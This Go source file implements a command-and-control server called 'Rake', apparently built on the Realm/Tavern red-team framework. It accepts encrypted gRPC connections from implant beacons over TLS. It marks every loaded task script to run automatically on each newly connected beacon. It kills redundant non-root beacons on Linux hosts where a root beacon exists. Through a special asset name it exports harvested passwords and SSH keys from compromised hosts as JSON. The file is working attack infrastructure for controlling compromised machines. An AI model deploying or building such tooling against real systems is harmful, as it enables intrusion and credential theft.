package main

import (
	"context"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io/fs"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"entgo.io/ent/dialect/sql"
	"github.com/jessevdk/go-flags"
	_ "github.com/mattn/go-sqlite3"
	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/peer"
	"google.golang.org/grpc/status"
	"realm.pub/tavern/internal/c2"
	"realm.pub/tavern/internal/c2/c2pb"
	"realm.pub/tavern/internal/c2/epb"
	"realm.pub/tavern/internal/cryptocodec"
	"realm.pub/tavern/internal/ent"
	"realm.pub/tavern/internal/ent/host"
	"realm.pub/tavern/internal/ent/migrate"
	_ "realm.pub/tavern/internal/ent/runtime"
	"realm.pub/tavern/internal/ent/tome"
	"realm.pub/tavern/tomes"
)

type Options struct {
	DBName     string `short:"d" long:"db-name" description:"Path to the SQLite database file" required:"true"`
	TomesPath  string `short:"t" long:"tomes-path" description:"Path to the Tomes directory" required:"true"`
	ListenAddr string `short:"l" long:"listen" description:"Address to listen on (e.g. :8000)" default:":8000"`
	PrivateKey string `short:"k" long:"private-key" description:"Base64 encoded X25519 private key. If not provided, a random one is generated."`
	CertFile   string `short:"c" long:"cert" description:"Path to TLS certificate file"`
	KeyFile    string `long:"key" description:"Path to TLS key file"`
}

// RakeServer wraps c2.Server to add extended functionality
type RakeServer struct {
	*c2.Server
	client *ent.Client
}

// CredentialExport is the JSON structure for exported credentials
type CredentialExport struct {
	Principal string `json:"principal"`
	Secret    string `json:"secret"`
	Kind      string `json:"kind"`
}

// Hook claim tasks
func (s *RakeServer) ClaimTasks(ctx context.Context, req *c2pb.ClaimTasksRequest) (*c2pb.ClaimTasksResponse, error) {
	// If we have a root beacon, and we are NOT root, kill ourself
	h, err := s.client.Host.Query().
		Where(host.IdentifierEQ(req.Beacon.Host.Identifier)).
		Only(ctx)
	// Non-root beacon, if there _is_ a root beacon, tell this one to close
	if err == nil && req.Beacon.Principal != "root" {
		// Loop through each beacon,
		beacons, err := h.QueryBeacons().All(ctx)
		if err == nil {
			for _, b := range beacons {
				if h.Platform == c2pb.Host_PLATFORM_LINUX {
					if b.Principal == "root" {
						resp := c2pb.ClaimTasksResponse{
							Tasks: []*c2pb.Task{
								{
									Id:        int64(99),
									QuestName: "sshhh",
									Tome: &epb.Tome{
										Eldritch: "agent._terminate_this_process_clowntown()",
									},
								},
							},
						}
						return &resp, nil
					}
				}
			}
		}
	}

	// else just use the normal one
	return s.Server.ClaimTasks(ctx, req)
}
func (s *RakeServer) FetchAsset(req *c2pb.FetchAssetRequest, stream c2pb.C2_FetchAssetServer) error {
	md, _ := metadata.FromIncomingContext(stream.Context())
	fmt.Printf("Stream context metadata: %+v\n", md)
	if strings.HasPrefix(req.Name, "host:credentials") {
		ctx := stream.Context()

		var hostIdentifier string
		if strings.HasPrefix(req.Name, "host:credentials:") {
			hostIdentifier = strings.TrimPrefix(req.Name, "host:credentials:")
		}

		if hostIdentifier == "" {
			return status.Errorf(codes.InvalidArgument, "must specify host identifier in asset name, e.g. host:credentials:<id>")
		}

		h, err := s.client.Host.Query().
			Where(host.IdentifierEQ(hostIdentifier)).
			Only(ctx)
		if ent.IsNotFound(err) {
			return status.Errorf(codes.NotFound, "host not found")
		}
		if err != nil {
			return status.Errorf(codes.Internal, "failed to query host: %v", err)
		}

		creds, err := h.QueryCredentials().All(ctx)
		if err != nil {
			return status.Errorf(codes.Internal, "failed to query credentials: %v", err)
		}

		var export []CredentialExport
		for _, c := range creds {
			kind := "UNKNOWN"
			switch c.Kind {
			case epb.Credential_KIND_PASSWORD:
				kind = "PASSWORD"
			case epb.Credential_KIND_SSH_KEY:
				kind = "SSH_KEY"
			}
			export = append(export, CredentialExport{
				Principal: c.Principal,
				Secret:    c.Secret,
				Kind:      kind,
			})
		}

		data, err := json.MarshalIndent(export, "", "  ")
		if err != nil {
			return status.Errorf(codes.Internal, "failed to marshal credentials: %v", err)
		}

		stream.SetHeader(metadata.Pairs(
			"file-size", fmt.Sprintf("%d", len(data)),
		))

		return stream.Send(&c2pb.FetchAssetResponse{
			Chunk: data,
		})
	}

	return s.Server.FetchAsset(req, stream)
}

func generateSelfSignedCert() (tls.Certificate, error) {
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return tls.Certificate{}, err
	}

	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			Organization: []string{"Rake C2"},
		},
		NotBefore: time.Now(),
		NotAfter:  time.Now().Add(365 * 24 * time.Hour),

		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return tls.Certificate{}, err
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: derBytes})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})

	return tls.X509KeyPair(certPEM, keyPEM)
}

func getRemoteIP(ctx context.Context) string {
	p, ok := peer.FromContext(ctx)
	if !ok {
		return "unknown"
	}
	host, _, err := net.SplitHostPort(p.Addr.String())
	if err != nil {
		return "unknown"
	}
	return host
}

func main() {
	var opts Options
	parser := flags.NewParser(&opts, flags.Default)
	if _, err := parser.Parse(); err != nil {
		if flagsErr, ok := err.(*flags.Error); ok && flagsErr.Type == flags.ErrHelp {
			os.Exit(0)
		}
		os.Exit(1)
	}

	// 1. Setup SQLite Connection
	drv, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?mode=rwc&cache=shared&_fk=1", opts.DBName))
	if err != nil {
		log.Fatalf("failed to open sqlite database: %v", err)
	}
	defer drv.Close()

	client := ent.NewClient(ent.Driver(drv))
	defer client.Close()

	ctx := context.Background()

	// 2. Create Schema (Migrations)
	if err := client.Schema.Create(
		ctx,
		migrate.WithGlobalUniqueID(true),
	); err != nil {
		log.Fatalf("failed to initialize graph schema: %v", err)
	}
	log.Printf("Database initialized at %s", opts.DBName)

	// 3. Load Tomes
	log.Printf("Loading tomes from %s", opts.TomesPath)
	tomesFS := os.DirFS(opts.TomesPath)

	if readDirFS, ok := tomesFS.(fs.ReadDirFS); ok {
		if err := tomes.UploadTomes(ctx, client, readDirFS); err != nil {
			log.Fatalf("failed to upload tomes: %v", err)
		}
	} else {
		log.Fatalf("os.DirFS result does not implement fs.ReadDirFS")
	}

	// 3a. Mark Tomes as Autorun
	_, err = client.Tome.Update().
		Where(tome.RunOnNewBeaconCallback(false)).
		SetRunOnNewBeaconCallback(true).
		Save(ctx)
	if err != nil {
		log.Printf("failed to mark tomes as autorun: %v", err)
	} else {
		log.Println("Marked all tomes as autorun (RunOnNewBeaconCallback).")
	}

	log.Println("Tomes loaded successfully.")

	// 4. Setup Key Pair
	var privKey *ecdh.PrivateKey
	var pubKey *ecdh.PublicKey
	curve := ecdh.X25519()

	keyPath := opts.DBName + ".grpc.key"
	if opts.PrivateKey == "" {
		if _, err := os.Stat(keyPath); err == nil {
			log.Printf("Found existing key at %s, loading...", keyPath)
			content, err := os.ReadFile(keyPath)
			if err != nil {
				log.Fatalf("failed to read private key file: %v", err)
			}
			opts.PrivateKey = strings.TrimSpace(string(content))
		}
	}

	if opts.PrivateKey != "" {
		// If it's a file path (other than the default one we might have just checked)
		if _, err := os.Stat(opts.PrivateKey); err == nil {
			content, err := os.ReadFile(opts.PrivateKey)
			if err != nil {
				log.Fatalf("failed to read private key file: %v", err)
			}
			opts.PrivateKey = strings.TrimSpace(string(content))
		}

		keyBytes, err := base64.StdEncoding.DecodeString(opts.PrivateKey)
		if err != nil {
			log.Fatalf("failed to decode private key: %v", err)
		}
		privKey, err = curve.NewPrivateKey(keyBytes)
		if err != nil {
			log.Fatalf("invalid private key: %v", err)
		}
	} else {
		log.Println("No private key provided and none found at default path, generating a random one...")
		var err error
		privKey, err = curve.GenerateKey(rand.Reader)
		if err != nil {
			log.Fatalf("failed to generate private key: %v", err)
		}

		// Save the generated key
		log.Printf("Saving generated GRPC private key to %s", keyPath)
		keyBytes := privKey.Bytes()
		encodedKey := base64.StdEncoding.EncodeToString(keyBytes)
		if err := os.WriteFile(keyPath, []byte(encodedKey), 0600); err != nil {
			log.Printf("Warning: failed to save generated key: %v", err)
		}
	}

	pubKey = privKey.PublicKey()
	log.Printf("Server Public Key (Base64): %s", base64.StdEncoding.EncodeToString(pubKey.Bytes()))

	// 5. Setup gRPC Server
	// We use our custom RakeServer
	baseC2 := c2.New(client, nil, nil)
	rakeSrv := &RakeServer{
		Server: baseC2,
		client: client,
	}

	xchacha := cryptocodec.StreamDecryptCodec{
		Csvc: cryptocodec.NewCryptoSvc(privKey),
	}

	grpcSrv := grpc.NewServer(
		grpc.ForceServerCodecV2(xchacha),
	)

	c2pb.RegisterC2Server(grpcSrv, rakeSrv)

	// 6. Start Server (TLS)
	log.Printf("Listening on %s (TLS)", opts.ListenAddr)

	var tlsConfig *tls.Config
	if opts.CertFile != "" && opts.KeyFile != "" {
		cert, err := tls.LoadX509KeyPair(opts.CertFile, opts.KeyFile)
		if err != nil {
			log.Fatalf("failed to load TLS keys: %v", err)
		}
		tlsConfig = &tls.Config{
			Certificates: []tls.Certificate{cert},
			NextProtos:   []string{"h2"},
		}
	} else {
		log.Println("No TLS keys provided, generating self-signed certificate...")
		cert, err := generateSelfSignedCert()
		if err != nil {
			log.Fatalf("failed to generate self-signed certificate: %v", err)
		}
		tlsConfig = &tls.Config{
			Certificates: []tls.Certificate{cert},
			NextProtos:   []string{"h2"},
		}
	}

	lis, err := net.Listen("tcp", opts.ListenAddr)
	if err != nil {
		log.Fatalf("failed to listen: %v", err)
	}

	tlsLis := tls.NewListener(lis, tlsConfig)

	// Setup HTTP/1.x / HTTP/2 multiplexer
	mux := http.NewServeMux()
	mux.HandleFunc("/status", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain")
		fmt.Fprintf(w, "%s\n", base64.StdEncoding.EncodeToString(pubKey.Bytes()))
	})

	// Create a handler that routes traffic to gRPC or HTTP mux based on protocol and content type
	rootHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.ProtoMajor == 2 && strings.Contains(r.Header.Get("Content-Type"), "application/grpc") {
			grpcSrv.ServeHTTP(w, r)
		} else {
			mux.ServeHTTP(w, r)
		}
	})

	// Use http.Serve instead of grpcSrv.Serve to handle both
	srv := &http.Server{
		Handler: rootHandler,
	}

	if err := srv.Serve(tlsLis); err != nil {
		log.Fatalf("server failed: %v", err)
	}
}
